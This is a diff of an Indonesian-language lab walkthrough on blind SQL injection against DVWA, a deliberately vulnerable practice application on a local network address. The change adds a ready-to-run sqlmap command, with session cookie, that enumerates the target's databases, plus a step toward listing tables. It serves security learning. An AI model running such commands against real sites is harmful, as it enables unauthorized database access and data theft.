@@ -21,11 +21,17 @@ sebelum ke <b><i> SQL Injection </i></b> kita cari tahu dulu PHPSESSID nya, yait
 
 ![Screenshot (468)](https://user-images.githubusercontent.com/118157585/216914472-d1365172-f36a-4f67-b3fd-b78ce72bccf4.png)
 
-nahhhh sekarang kita coba crack databases nya, ada apa ajasih disana...
-ternyata disana ada <b><i> * dvwa dan * information_scheme </i></b>
+nahhhh sekarang kita coba crack databases nya, ada apa ajasih disana. dengan mengetikkan perintah :
+
+```
+sqlmap -u 'http://192.168.18.115/DVWA/vulnarebilities/sqli_blind/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=gg58gd3lp0rqeq3rftt96l1b3kq' --dbs
+```
+
+ternyata disana ada <b><i> * dvwa dan * information_scheme </i></b>.
 
 ![Screenshot (473)](https://user-images.githubusercontent.com/118157585/216918953-f94e854d-a85d-4602-b0b2-c8c0d89ba805.png)
 
+sekarang kita lanjut untuk mencari tables nya
 ![Screenshot (469)](https://user-images.githubusercontent.com/118157585/216914534-a11d21ed-488b-4cc2-964c-80d04f2316c6.png)
 ![Screenshot (470)](https://user-images.githubusercontent.com/118157585/216914627-66c0f0cc-8238-4fb1-9e14-3a5366b64288.png)
 ![Screenshot (471)](https://user-images.githubusercontent.com/118157585/216914738-07273ce5-2666-4607-89a5-e8390b9aa9c0.png)
